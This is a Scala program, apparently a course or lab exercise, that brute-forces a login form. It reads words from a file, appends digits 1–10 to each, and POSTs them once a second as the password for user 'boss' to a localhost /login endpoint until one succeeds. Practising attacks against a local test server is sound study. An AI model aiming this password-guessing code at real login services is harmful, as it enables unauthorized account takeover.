package part2

import java.nio.file.Paths
import java.util.concurrent._
import scala.concurrent.duration._

import cats.effect._
import cats.effect.concurrent.Deferred
import fs2._
import fs2.io.file

import org.http4s.client.{Client, JavaNetClientBuilder}
import org.http4s.{Status, Request, UrlForm, Uri}
import org.http4s.Method.POST


object Part4 extends IOApp {
  def run(args: List[String]) : IO[ExitCode] = {
    println("TRY TO GUESS PASSWORD :")
        findPassword().compile.drain.as(ExitCode.Success)
  }

  def makeForm(pw: String): UrlForm = UrlForm("username" -> "boss", "password" -> pw)

  def findPassword(): Stream[IO, Unit] = {
    val blockingPool = Executors.newFixedThreadPool(10)
    val blocker = Blocker.liftExecutorService(blockingPool)
    val client: Client[IO] = JavaNetClientBuilder[IO](blocker).create

    Stream.eval(Deferred[IO, Unit]).flatMap { switch =>
      Stream.resource(Blocker[IO])
        .flatMap { blocker =>
          file.readAll[IO](Paths.get("./myfile.txt"), blocker, 4096)
            .interruptWhen(switch.get.attempt)
            .through(text.utf8Decode)
            .through(text.lines)
            .flatMap(line =>
              Stream.emits(1 to 10)
                .map(index => s"$line$index")
            )
            .metered(1.second)
            .flatMap(pw => {
              val req = Request[IO](POST, Uri.unsafeFromString("http://localhost:5000/login"))
              Stream.eval(
                client.fetch(req.withEntity(makeForm(pw))) {
                  case Status.Successful(r) => {
                    println(s"FOUND PASSWORD: ${pw}")
                    switch.complete(())
                  }
                  case r => IO.unit
                }
              )
            })
        }
    }
  }
}
